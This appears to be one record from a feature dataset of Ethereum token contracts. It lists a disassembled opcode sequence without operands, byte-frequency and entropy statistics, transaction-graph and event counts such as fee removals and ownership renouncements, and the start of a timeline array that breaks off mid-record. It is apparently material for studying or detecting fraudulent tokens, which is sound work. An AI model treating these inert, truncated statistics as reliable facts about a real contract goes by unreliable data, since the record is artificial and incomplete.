PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND SWAP1 POP DUP2 PUSH1 DUP1 PUSH2 EXP DUP2 SLOAD DUP2 PUSH20 MUL NOT AND SWAP1 DUP4 PUSH20 AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 AND DUP2 PUSH20 AND PUSH32 PUSH1 MLOAD PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 DUP2 DUP4 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP2 DUP4 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH20 AND DUP4 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 PUSH20 AND DUP3 PUSH20 AND SUB PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 DUP2 GT PUSH2 JUMPI PUSH1 MLOAD PUSH32 DUP2 MSTORE PUSH1 ADD PUSH2 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 DUP2 DUP4 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP3 DUP3 MSTORE PUSH1 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 DUP2 ADD SWAP1 POP PUSH2 JUMP JUMPDEST PUSH1 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 PUSH1 NOT PUSH1 DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH2 DUP2 DUP6 PUSH2 JUMP JUMPDEST SWAP4 POP PUSH2 DUP2 DUP6 PUSH1 DUP7 ADD PUSH2 JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 REVERT JUMPDEST PUSH1 PUSH20 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 DUP2 CALLDATALOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 DUP2 CALLDATALOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP4 POP POP PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 PUSH1 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP5 DUP3 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP5 DUP3 DUP6 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP6 DUP3 DUP7 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 PUSH2 PUSH2 DUP5 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP PUSH2 PUSH1 DUP4 ADD DUP10 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP4 ADD DUP9 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP4 ADD DUP8 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP4 ADD DUP7 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP4 ADD DUP6 PUSH2 JUMP JUMPDEST PUSH2 PUSH1 DUP4 ADD DUP5 PUSH2 JUMP JUMPDEST SWAP8 SWAP7 POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP2 MLOAD SWAP1 POP PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP4 POP POP PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP3 POP POP PUSH1 PUSH2 DUP7 DUP3 DUP8 ADD PUSH2 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 PUSH2 PUSH1 DUP4 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP3 PUSH2 JUMP JUMPDEST PUSH1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 DUP4 ADD MSTORE PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 PUSH2 DUP3 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP UNKNOWN_0xfe GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE SHA3 PUSH3 SHA3 PUSH2 PUSH22 ADDRESS GASPRICE SHA3 PUSH21 PUSH20 PUSH7 PUSH15 PUSH2 PUSH6 SHA3 PUSH5 PUSH20 PUSH6 PUSH7 UNKNOWN_0x4c UNKNOWN_0xd5 BLOCKHASH ORIGIN XOR SLOAD SMOD UNKNOWN_0xcf DUP5 UNKNOWN_0xc STATICCALL UNKNOWN_0xd3 SELFDESTRUCT PUSH2 UNKNOWN_0xbb UNKNOWN_0xcf DUP3 LOG4 CALL MULMOD PUSH4 UNKNOWN_0xcc UNKNOWN_0xa9 DIFFICULTY PUSH5 STOP ADDMOD SLT STOP CALLER",
  "opcode_entropy": 4.620803034415973,
  "opcode_count": 4769,
  "unique_opcodes": 94,
  "byte_entropy": 5.281007513712814,
  "byte_0x": 9.746588693957115e-05,
  "byte_60": 0.05584795321637427,
  "byte_80": 0.015302144249512671,
  "byte_40": 0.009941520467836258,
  "byte_52": 0.013157894736842105,
  "byte_04": 0.008089668615984405,
  "byte_36": 0.001267056530214425,
  "byte_10": 0.0029239766081871343,
  "byte_61": 0.0594541910331384,
  "byte_01": 0.02202729044834308,
  "byte_39": 0.0009746588693957114,
  "byte_57": 0.009064327485380117,
  "byte_00": 0.09035087719298246,
  "byte_35": 0.00029239766081871346,
  "byte_e0": 0.001267056530214425,
  "byte_1c": 0.003898635477582846,
  "byte_63": 0.006920077972709552,
  "byte_75": 0.001267056530214425,
  "byte_fc": 0.0005847953216374269,
  "byte_11": 0.001949317738791423,
  "byte_ab": 0.0005847953216374269,
  "byte_a4": 0.0005847953216374269,
  "byte_c2": 0.0007797270955165692,
  "byte_d7": 0.0003898635477582846,
  "byte_6f": 0.003313840155945419,
  "byte_14": 0.0042884990253411305,
  "byte_2e": 0.0001949317738791423,
  "byte_a9": 0.0005847953216374269,
  "byte_05": 0.0027290448343079924,
  "byte_9c": 0.0004873294346978557,
  "byte_bb": 0.00029239766081871346,
  "byte_6b": 0.0007797270955165692,
  "byte_cd": 0.0001949317738791423,
  "byte_f4": 0.00029239766081871346,
  "byte_ba": 0.00029239766081871346,
  "byte_b9": 0.0003898635477582846,
  "byte_a8": 0.0003898635477582846,
  "byte_d5": 0.00029239766081871346,
  "byte_4f": 0.0017543859649122807,
  "byte_7d": 0.0004873294346978557,
  "byte_5e": 0.0003898635477582846,
  "byte_d3": 0.0004873294346978557,
  "byte_dd": 0.0007797270955165692,
  "byte_62": 0.0015594541910331384,
  "byte_ed": 0.00029239766081871346,
  "byte_3e": 0.0003898635477582846,
  "byte_fe": 0.0005847953216374269,
  "byte_f2": 0.0007797270955165692,
  "byte_fd": 0.0044834307992202725,
  "byte_e3": 0.0003898635477582846,
  "byte_8b": 0.00029239766081871346,
  "byte_3b": 0.00029239766081871346,
  "byte_6c": 0.0021442495126705653,
  "byte_56": 0.03235867446393762,
  "byte_5b": 0.041130604288499024,
  "byte_03": 0.009649122807017544,
  "byte_1d": 0.005360623781676413,
  "byte_b4": 0.00029239766081871346,
  "byte_a5": 0.0001949317738791423,
  "byte_82": 0.011695906432748537,
  "byte_8d": 0.0005847953216374269,
  "byte_5f": 0.0001949317738791423,
  "byte_81": 0.01793372319688109,
  "byte_e2": 0.0005847953216374269,
  "byte_ad": 0.0004873294346978557,
  "byte_cb": 0.0001949317738791423,
  "byte_d8": 0.0003898635477582846,
  "byte_95": 0.0005847953216374269,
  "byte_9b": 0.0004873294346978557,
  "byte_41": 0.0004873294346978557,
  "byte_50": 0.033625730994152045,
  "byte_93": 0.0011695906432748538,
  "byte_51": 0.007992202729044834,
  "byte_02": 0.00341130604288499,
  "byte_42": 0.0004873294346978557,
  "byte_96": 0.0003898635477582846,
  "byte_68": 0.0013645224171539962,
  "byte_49": 0.0006822612085769981,
  "byte_9a": 9.746588693957115e-05,
  "byte_28": 0.0006822612085769981,
  "byte_18": 0.0016569200779727095,
  "byte_d2": 0.0015594541910331384,
  "byte_c6": 9.746588693957115e-05,
  "byte_59": 0.0005847953216374269,
  "byte_0a": 0.003996101364522417,
  "byte_fb": 0.0008771929824561404,
  "byte_70": 0.0009746588693957114,
  "byte_a0": 0.0014619883040935672,
  "byte_31": 0.0001949317738791423,
  "byte_17": 0.0013645224171539962,
  "byte_71": 0.0004873294346978557,
  "byte_a6": 0.0001949317738791423,
  "byte_54": 0.005263157894736842,
  "byte_06": 0.0014619883040935672,
  "byte_de": 0.0003898635477582846,
  "byte_09": 0.001267056530214425,
  "byte_a7": 0.0004873294346978557,
  "byte_b3": 0.0008771929824561404,
  "byte_16": 0.015497076023391813,
  "byte_0d": 0.0011695906432748538,
  "byte_d9": 0.0001949317738791423,
  "byte_23": 0.0028265107212475634,
  "byte_b8": 0.00029239766081871346,
  "byte_72": 0.003996101364522417,
  "byte_3c": 0.0001949317738791423,
  "byte_e5": 0.0003898635477582846,
  "byte_67": 0.00029239766081871346,
  "byte_7f": 0.004093567251461989,
  "byte_4c": 0.0004873294346978557,
  "byte_76": 0.0004873294346978557,
  "byte_33": 0.0005847953216374269,
  "byte_ca": 0.0004873294346978557,
  "byte_ce": 0.00029239766081871346,
  "byte_83": 0.006432748538011696,
  "byte_22": 0.0016569200779727095,
  "byte_37": 0.0004873294346978557,
  "byte_15": 0.006920077972709552,
  "byte_69": 0.0011695906432748538,
  "byte_24": 0.0028265107212475634,
  "byte_5a": 0.0005847953216374269,
  "byte_2b": 0.0004873294346978557,
  "byte_f0": 0.0001949317738791423,
  "byte_91": 0.01773879142300195,
  "byte_90": 0.03586744639376218,
  "byte_a1": 0.0005847953216374269,
  "byte_34": 0.0022417153996101362,
  "byte_86": 0.00253411306042885,
  "byte_64": 0.00253411306042885,
  "byte_f3": 0.0021442495126705653,
  "byte_c3": 0.0013645224171539962,
  "byte_be": 9.746588693957115e-05,
  "byte_85": 0.0030214424951267057,
  "byte_d0": 0.0003898635477582846,
  "byte_ee": 9.746588693957115e-05,
  "byte_bf": 0.0001949317738791423,
  "byte_1e": 0.00341130604288499,
  "byte_26": 0.0013645224171539962,
  "byte_25": 0.001851851851851852,
  "byte_c9": 0.0001949317738791423,
  "byte_38": 0.00029239766081871346,
  "byte_4d": 0.0004873294346978557,
  "byte_a2": 0.00029239766081871346,
  "byte_94": 0.0001949317738791423,
  "byte_78": 0.0010721247563352826,
  "byte_8e": 0.0004873294346978557,
  "byte_b5": 0.0001949317738791423,
  "byte_af": 0.0003898635477582846,
  "byte_07": 0.0020467836257309943,
  "byte_f9": 9.746588693957115e-05,
  "byte_dc": 0.00029239766081871346,
  "byte_4b": 9.746588693957115e-05,
  "byte_08": 0.003801169590643275,
  "byte_46": 0.0001949317738791423,
  "byte_77": 0.0011695906432748538,
  "byte_97": 0.0003898635477582846,
  "byte_cf": 0.0004873294346978557,
  "byte_1f": 0.0027290448343079924,
  "byte_e4": 0.0003898635477582846,
  "byte_fa": 0.00029239766081871346,
  "byte_0f": 0.0005847953216374269,
  "byte_3a": 0.001949317738791423,
  "byte_55": 0.001851851851851852,
  "byte_92": 0.0050682261208577,
  "byte_9f": 0.0001949317738791423,
  "byte_bd": 9.746588693957115e-05,
  "byte_df": 0.0001949317738791423,
  "byte_e8": 0.0008771929824561404,
  "byte_f5": 0.0007797270955165692,
  "byte_20": 0.019785575048732944,
  "byte_32": 0.0014619883040935672,
  "byte_47": 0.00029239766081871346,
  "byte_5d": 0.0001949317738791423,
  "byte_eb": 0.0001949317738791423,
  "byte_65": 0.006335282651072124,
  "byte_ae": 0.0001949317738791423,
  "byte_0b": 0.0027290448343079924,
  "byte_84": 0.005555555555555556,
  "byte_8c": 0.0006822612085769981,
  "byte_d6": 9.746588693957115e-05,
  "byte_27": 0.001949317738791423,
  "byte_73": 0.013450292397660818,
  "byte_ff": 0.22183235867446394,
  "byte_48": 0.0003898635477582846,
  "byte_12": 0.0016569200779727095,
  "byte_89": 0.0001949317738791423,
  "byte_6e": 0.00341130604288499,
  "byte_0c": 0.0005847953216374269,
  "byte_19": 0.0014619883040935672,
  "byte_30": 0.001267056530214425,
  "byte_29": 0.00029239766081871346,
  "byte_4e": 0.0003898635477582846,
  "byte_58": 0.00029239766081871346,
  "byte_1a": 0.001949317738791423,
  "byte_0e": 0.0004873294346978557,
  "byte_a3": 0.0007797270955165692,
  "byte_45": 0.0022417153996101362,
  "byte_f6": 0.00029239766081871346,
  "byte_8a": 0.0001949317738791423,
  "byte_79": 0.0010721247563352826,
  "byte_7c": 9.746588693957115e-05,
  "byte_da": 0.0004873294346978557,
  "byte_6a": 9.746588693957115e-05,
  "byte_21": 0.0010721247563352826,
  "byte_e1": 9.746588693957115e-05,
  "byte_ec": 0.0007797270955165692,
  "byte_d1": 0.0003898635477582846,
  "byte_c0": 0.0001949317738791423,
  "byte_f7": 0.00029239766081871346,
  "byte_b2": 0.0001949317738791423,
  "byte_c8": 0.0003898635477582846,
  "byte_c7": 0.0001949317738791423,
  "byte_13": 0.0008771929824561404,
  "byte_88": 0.0006822612085769981,
  "byte_7b": 0.0003898635477582846,
  "byte_6d": 0.001851851851851852,
  "byte_87": 0.0008771929824561404,
  "byte_8f": 9.746588693957115e-05,
  "byte_ac": 0.0001949317738791423,
  "byte_43": 0.001267056530214425,
  "byte_cc": 0.0001949317738791423,
  "byte_1b": 0.0007797270955165692,
  "byte_b0": 0.0003898635477582846,
  "byte_aa": 0.0003898635477582846,
  "byte_f1": 0.0006822612085769981,
  "byte_c4": 0.0005847953216374269,
  "byte_ef": 0.00029239766081871346,
  "byte_3d": 0.0003898635477582846,
  "byte_53": 0.00029239766081871346,
  "byte_44": 0.0001949317738791423,
  "byte_bc": 9.746588693957115e-05,
  "byte_2d": 0.0001949317738791423,
  "byte_74": 0.0027290448343079924,
  "byte_b6": 9.746588693957115e-05,
  "byte_2c": 9.746588693957115e-05,
  "byte_c5": 0.00029239766081871346,
  "byte_4a": 0.0001949317738791423,
  "byte_7a": 0.0008771929824561404,
  "byte_3f": 0.0001949317738791423,
  "byte_66": 0.0009746588693957114,
  "byte_b7": 9.746588693957115e-05,
  "byte_db": 0.0001949317738791423,
  "byte_2f": 9.746588693957115e-05,
  "byte_e9": 0.0001949317738791423,
  "byte_2a": 9.746588693957115e-05,
  "byte_e6": 9.746588693957115e-05,
  "num_nodes": 66,
  "num_edges": 65,
  "avg_degree": 1.9696969696969697,
  "density": 0.015151515151515152,
  "connected_components": 1,
  "avg_clustering": 0.0,
  "txn_nums": 89,
  "event_nums": 192,
  "creation_block": 17193258,
  "creation_timestamp": 1683275483,
  "life_time": 2229720.0,
  "duration_seconds": 27019044.0,
  "from_creation_to_transfer": 0.0,
  "num_addresses": 67,
  "num_buyers": 1,
  "num_sellers": 65,
  "num_creator_transfers": 0,
  "buy_amt": 0,
  "sell_amt": 0.0,
  "avg_value": 0.0,
  "txn_per_block": 3.991530778962929e-05,
  "avg_gas_limit": 123075.26966292135,
  "std_gas_limit": 546455.4485125078,
  "avg_gas_used": 104527.40449438202,
  "std_gas_used": 547787.087660741,
  "avg_gas_price": 200064766073.41574,
  "std_gas_price": 41342597373.7512,
  "ownershiptransferred_num": 2,
  "transfer_num": 5,
  "approval_num": 89,
  "atinversebrah_num": 1,
  "approve_num": 80,
  "renounceownership_num": 1,
  "removefee_num": 2,
  "timeline_sequence": [
    [
      17193258,
      1683275483,
      0,
      76,
      0,
      5243017,
      84889086540,
      0,
      1,
      13259904,
      5243017,
      5884011
    ],
    [
      17194672,
      1683292583,
      1,
      156,
      0,
      46922,
      139107136649,
      0,
      1,
      11224292,
      46922,
      5882597
    ],
    [
      17195421,
      1683301655,
      2,
      122,
      0,
      82375,
      180850635057,
      0,
      1,
      8816278,
      54917,
      5881848
    ],
    [
      17195480,
      1683302375,
      16,
      27,
      0,
      147054,
      194612671562,
      0,
      1,
      2787901,
      47054,
      5881789
    ],
    [
      17195480,
      1683302375,
      2,
      28,
      0,
      147054,
      194612671562,
      0,
      1,
      2834955,
      47054,
      5881789
    ],
    [
      17195480,
      1683302375,
      2,
      29,
      0,
